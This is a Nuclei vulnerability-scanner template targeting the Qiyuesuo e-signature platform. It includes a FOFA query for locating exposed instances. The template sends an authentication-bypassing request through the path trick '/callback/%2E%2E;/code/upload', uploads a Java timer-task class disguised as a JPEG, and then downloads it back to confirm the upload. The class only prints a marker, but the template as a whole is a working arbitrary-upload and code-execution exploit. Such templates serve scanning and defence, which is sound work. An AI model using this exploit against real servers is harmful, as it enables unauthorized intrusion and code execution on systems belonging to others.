id: qiyuesuo-code-fileupload
info:
  name: 契约锁电子签章平台 code upload - fileupload
  author: leadlife
  severity: critical
  description: 契约锁-电子签章系统 /code/upload 接口存在任意文件上传
  reference:
    - todo
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="契约锁-电子签署平台"
  tags: qiyuesuo,fileupload
    
http:
  - raw:
      - |+
        POST /callback/%2E%2E;/code/upload HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqhisqtka

        ------WebKitFormBoundaryqhisqtka
        Content-Disposition: form-data; name="type";

        TIMETASK
        ------WebKitFormBoundaryqhisqtka
        Content-Disposition: form-data; name="file"; filename="uhczwxno.jpg"
        Content-Type: image/jpeg

        package qiyuesuo;
        import com.qiyuesuo.utask.java.BaseTimerTask;
        public class xfdajwbr extends BaseTimerTask{
        static {try{System.out.println("zxpjcsdq");}catch (Exception e){}}}
        ------WebKitFormBoundaryqhisqtka--

      - |+
        GET /callback/%2E%2E;/code/download?codeId={{getid}} HTTP/1.1
        Host: {{Hostname}}


    extractors: 
      - type: json
        part: body_1
        internal: true
        name: getid
        json:
          - ".result.id"

    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
          - contains_all(body_2,'package','qiyuesuo')
        condition: and
